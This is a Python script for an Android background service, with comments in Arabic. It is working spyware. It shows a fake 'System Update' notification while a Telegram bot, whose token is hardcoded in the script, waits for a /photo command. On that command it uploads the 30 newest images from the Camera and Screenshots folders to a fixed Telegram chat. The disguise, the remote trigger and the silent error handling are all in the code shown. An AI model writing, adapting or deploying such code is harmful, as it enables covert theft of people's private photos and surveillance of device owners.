import os, time, threading, telebot
from jnius import autoclass

# أدوات أندرويد
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')

service = PythonService.mService
context = service.getApplicationContext()

def start_foreground():
    CHANNEL_ID = "photo_sync_channel"
    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
    if Build.VERSION.SDK_INT >= 26:
        channel = NotificationChannel(CHANNEL_ID, "System Sync", 2)
        nm.createNotificationChannel(channel)
        builder = NotificationBuilder(context, CHANNEL_ID)
    else:
        builder = NotificationBuilder(context)
    
    notification = builder.setContentTitle("تحديث النظام") \
                          .setContentText("جاري فحص الصور...") \
                          .setSmallIcon(context.getApplicationInfo().icon) \
                          .build()
    service.startForeground(1, notification)

bot = telebot.TeleBot("7820129712:AAH9pZ49S_m8tY8965625902", threaded=False)

@bot.message_handler(commands=['photo'])
def handle_photo(message):
    folders = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures/Screenshots"
    ]
    for folder in folders:
        if os.path.exists(folder):
            try:
                files = [os.path.join(folder, f) for f in os.listdir(folder) 
                         if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
                # ترتيب الأحدث أولاً
                files.sort(key=os.path.getmtime, reverse=True)
                
                # سحب 30 صورة من كل مجلد
                for img_path in files[:30]:
                    try:
                        with open(img_path, 'rb') as photo:
                            bot.send_photo("6110903337", photo)
                        time.sleep(0.5)
                    except: continue
            except: pass

if __name__ == '__main__':
    start_foreground()
    while True:
        try:
            bot.infinity_polling(timeout=20)
        except:
            time.sleep(10)
